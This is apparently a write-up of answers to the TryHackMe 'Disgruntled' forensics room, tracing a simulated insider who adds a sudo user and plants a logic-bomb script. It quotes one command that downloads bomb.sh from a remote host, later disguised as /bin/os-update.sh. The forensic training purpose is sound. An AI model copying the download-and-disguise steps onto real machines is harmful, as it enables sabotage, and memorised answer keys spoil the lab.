@@ -1,0 +1,32 @@
+Disgruntled
+https://tryhackme.com/room/disgruntled
+
+The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
+/usr/bin/apt install dokuwiki
+
+What was the present working directory (PWD) when the previous command was run?
+/home/cybert
+
+Which user was created after the package from the previous task was installed?
+it-admin
+
+A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
+Dec 28 06:27:34
+
+A script file was opened using the "vi" text editor. What is the name of this file?
+bomb.sh
+
+What is the command used that created the file bomb.sh?
+curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+
+The file was renamed and moved to a different directory. What is the full path of this file now?
+/bin/os-update.sh
+
+When was the file from the previous question last modified? (Format: Month Day HH:MM)
+Dec 28 06:29
+
+What is the name of the file that will get created when the file from the first question executes?
+goodbye.txt
+
+At what time will the malicious file trigger? (Format: HH:MM AM/PM)
+08:00 AM
